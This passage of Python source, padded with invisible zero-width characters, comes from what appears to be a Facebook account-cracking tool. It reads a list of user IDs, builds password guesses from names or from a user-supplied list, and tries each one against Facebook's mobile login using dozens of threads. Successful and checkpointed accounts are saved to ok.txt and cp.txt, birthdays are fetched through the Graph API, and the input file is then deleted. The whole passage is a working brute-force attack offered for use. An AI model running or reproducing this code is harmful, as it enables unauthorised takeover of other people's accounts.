 ​                        ​print​(​"​\r​\x1b​[0;33m[​\x1b​[0;37mCrack​\x1b​[0;33m]​\x1b​[0;37m %s/%s ​\x1b​[0;32m[​\x1b​[0;37mOK : %s​\x1b​[0;32m] ​\x1b​[0;33m[​\x1b​[0;37mCP : %s​\x1b​[0;33m]​\x1b​[0;37m"​%​(​self​.​ko​,​len​(​self​.​fl​),​len​(​self​.​ada​),​len​(​self​.​cp​)), ​end​=​' '​);​sys​.​stdout​.​flush​() 
 ​                ​except​: 
 ​                        ​self​.​main​(​fl​) 
  
 ​class​ ​crackttl​: 
 ​        ​os​.​system​(​"clear"​) 
 ​        ​banner​() 
 ​        ​def​ ​__init__​(​self​,​isifile​): 
 ​                ​self​.​ada​=​[] 
 ​                ​self​.​cp​=​[] 
 ​                ​self​.​ko​=​0 
 ​                ​print​((​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Crack With Pass Default/Manual [d/m]"​)) 
 ​                ​while​ ​True​: 
 ​                        ​f​=​input​(​k​+​"["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Choose : "​) 
 ​                        ​if​ ​f​==​""​:​continue 
 ​                        ​elif​ ​f​==​"m"​: 
 ​                                ​try​: 
 ​                                        ​while​ ​True​: 
 ​                                                ​try​: 
 ​                                                        ​self​.​apk​=​isifile 
 ​                                                        ​self​.​fs​=​open​(​self​.​apk​).​read​().​splitlines​() 
 ​                                                        ​break 
 ​                                                ​except​ ​Exception​ ​as​ ​e​: 
 ​                                                        ​print​((​"   %s"​%​e​)) 
 ​                                                        ​continue 
 ​                                        ​self​.​fl​=​[] 
 ​                                        ​for​ ​i​ ​in​ ​self​.​fs​: 
 ​                                                ​try​: 
 ​                                                        ​self​.​fl​.​append​({​"id"​:​i​.​split​(​"<=>"​)[​0​]}) 
 ​                                                ​except​:​continue 
 ​                                ​except​ ​Exception​ ​as​ ​e​: 
 ​                                        ​print​((​"   %s"​%​e​)) 
 ​                                        ​continue 
 ​                                ​print​((​k​+​"["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Example : sayang,bismillah,123456"​)) 
 ​                                ​self​.​pwlist​() 
 ​                                ​break 
 ​                        ​elif​ ​f​==​"d"​: 
 ​                                ​try​: 
 ​                                        ​while​ ​True​: 
 ​                                                ​try​: 
 ​                                                        ​self​.​apk​=​isifile 
 ​                                                        ​self​.​fs​=​open​(​self​.​apk​).​read​().​splitlines​() 
 ​                                                        ​break 
 ​                                                ​except​ ​Exception​ ​as​ ​e​: 
 ​                                                        ​print​((​"   %s"​%​e​)) 
 ​                                                        ​continue 
 ​                                        ​self​.​fl​=​[] 
 ​                                        ​for​ ​i​ ​in​ ​self​.​fs​: 
 ​                                                ​try​: 
 ​                                                        ​self​.​fl​.​append​({​"id"​:​i​.​split​(​"<=>"​)[​0​],​"pw"​:​generate​(​i​.​split​(​"<=>"​)[​1​])}) 
 ​                                                ​except​:​continue 
 ​                                ​except​ ​Exception​ ​as​ ​e​: 
 ​                                        ​print​((​"   %s"​%​e​)) 
 ​                                ​print​((​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Crack Started..."​+​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Account [OK] Saved to : ok.txt"​+​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Account [CP] Saved to : cp.txt​\n​"​)) 
 ​                                ​ThreadPool​(​35​).​map​(​self​.​main​,​self​.​fl​) 
 ​                                ​os​.​remove​(​self​.​apk​) 
 ​                                ​exit​() 
 ​                                ​break 
 ​        ​def​ ​pwlist​(​self​): 
 ​                ​self​.​pw​=​input​(​k​+​"["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Password List : "​).​split​(​","​) 
 ​                ​if​ ​len​(​self​.​pw​) ​==​0​: 
 ​                        ​self​.​pwlist​() 
 ​                ​else​: 
 ​                        ​for​ ​i​ ​in​ ​self​.​fl​: 
 ​                                ​i​.​update​({​"pw"​:​self​.​pw​}) 
 ​                        ​print​((​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Crack Started..."​+​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Account [OK] Saved to : ok.txt"​+​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Account [CP] Saved to : cp.txt​\n​"​)) 
 ​                        ​ThreadPool​(​30​).​map​(​self​.​main​,​self​.​fl​) 
 ​                        ​os​.​remove​(​self​.​apk​) 
 ​                        ​exit​() 
 ​        ​def​ ​main​(​self​,​fl​): 
 ​                ​try​: 
 ​                        ​for​ ​i​ ​in​ ​fl​.​get​(​"pw"​): 
 ​                                ​log​=​ttll​(​fl​.​get​(​"id"​), 
 ​                                        ​i​,​"https://mbasic.facebook.com"​) 
 ​                                ​if​ ​log​.​get​(​"status"​)​==​"success"​: 
 ​                                        ​print​((​"​\r​\x1b​[0;32m[​\x1b​[0;37mOK​\x1b​[0;32m] %s • %s               "​%​(​fl​.​get​(​"id"​),​i​))) 
 ​                                        ​self​.​ada​.​append​(​"%s • %s"​%​(​fl​.​get​(​"id"​),​i​)) 
 ​                                        ​if​ ​fl​.​get​(​"id"​) ​in​ ​open​(​"ok.txt"​).​read​(): 
 ​                                                ​break 
 ​                                        ​else​: 
 ​                                                ​open​(​"ok.txt"​,​"a+"​).​write​( 
 ​                                                ​"%s • %s​\n​"​%​(​fl​.​get​(​"id"​),​i​)) 
 ​                                        ​break 
 ​                                ​elif​ ​log​.​get​(​"status"​)​==​"cp"​: 
 ​                                        ​try​: 
 ​                                                ​ke​=​requests​.​get​(​"https://graph.facebook.com/"​+​fl​.​get​(​"id"​)​+​"?access_token="​+​open​(​"login.txt"​,​"r"​).​read​()) 
 ​                                                ​tt​=​json​.​loads​(​ke​.​text​) 
 ​                                                ​ttl​=​tt​[​"birthday"​] 
 ​                                        ​except​:​pass 
 ​                                        ​print​((​"​\r​\x1b​[0;33m[​\x1b​[0;37mCP​\x1b​[0;33m] %s • %s • %s​\x1b​[0m   "​%​(​fl​.​get​(​"id"​),​i​,​str​(​ttl​)))) 
 ​                                        ​self​.​cp​.​append​(​"%s • %s"​%​(​fl​.​get​(​"id"​),​i​)) 
 ​                                        ​open​(​"cp.txt"​,​"a+"​).​write​( 
 ​                                                ​"%s • %s • %s​\n​"​%​(​fl​.​get​(​"id"​),​i​,​str​(​ttl​))) 
 ​                                        ​break 
 ​                                ​else​:​continue 
 ​                                         
 ​                        ​self​.​ko​+=​1 
 ​                        ​print​(​"​\r​\x1b​[0;33m[​\x1b​[0;37mCrack​\x1b​[0;33m]​\x1b​[0;37m %s/%s ​\x1b​[0;32m[​\x1b​[0;37mOK : %s​\x1b​[0;32m] ​\x1b​[0;33m[​\x1b​[0;37mCP : %s​\x1b​[0;33m]​\x1b​[0;37m"​%​(​self​.​ko​,​len​(​self​.​fl​),​len​(​self​.​ada​),​len​(​self​.​cp​)), ​end​=​' '​);​sys​.​stdout​.​flush​() 
 ​                ​except​: 
 ​                        ​self​.​main​(​fl​) 
 ​                         
 ​###### RESULTS ###### 
  
 ​def​ ​results​(​ramdhan​,​tricker​): 
 ​        ​if​ ​len​(​ramdhan​) ​!=​0​: 
 ​                ​print​((​"[OK] : "​+​str​(​len​(​ramdhan​)))) 
 ​        ​if​ ​len​(​ramdhan​) ​!=​0​: 
 ​                ​print​((​"[CP] : "​+​str​(​len​(​tricker​)))) 
 ​        ​if​ ​len​(​ramdhan​) ​==​0​ ​and​ ​len​(​tricker​) ​==​0​: 
 ​                ​print​(​"​\n​"​) 
 ​                ​print​((​k​+​"["​+​p​+​"!"​+​k​+​"]"​+​p​+​" No Result Found"​)) 
  
 ​def​ ​ress​(): 
 ​    ​os​.​system​(​"clear"​) 
 ​    ​banner​() 
 ​    ​print​((​k​+​"​\n​[ "​+​p​+​"Result Crack"​+​k​+​" ]"​+​p​)) 
 ​    ​print​((​k​+​"​\n​[ "​+​p​+​"OK"​+​k​+​" ]"​+​p​)) 
 ​    ​try​: 
 ​        ​os​.​system​(​"cat ok.txt"​) 
 ​    ​except​ ​IOError​: 
 ​        ​print​((​k​+​"["​+​p​+​"!"​+​k​+​"]"​+​p​+​" No Result Found"​)) 
 ​    ​print​((​k​+​"​\n​[ "​+​p​+​"CP"​+​k​+​" ]"​+​p​)) 
 ​    ​try​: 
 ​        ​os​.​system​(​"cat cp.txt"​) 
 ​    ​except​ ​IOError​: 
 ​        ​print​((​k​+​"["​+​p​+​"!"​+​k​+​"]"​+​p​+​" No Result Found"​)) 
 ​    ​input​(​k​+​"​\n​[ "​+​p​+​"Back"​+​k​+​" ]"​+​p​) 
 ​    ​menu​() 
  
  
  
  
 ​if​ ​__name__​==​"__main__"​: 
 ​        ​menu​()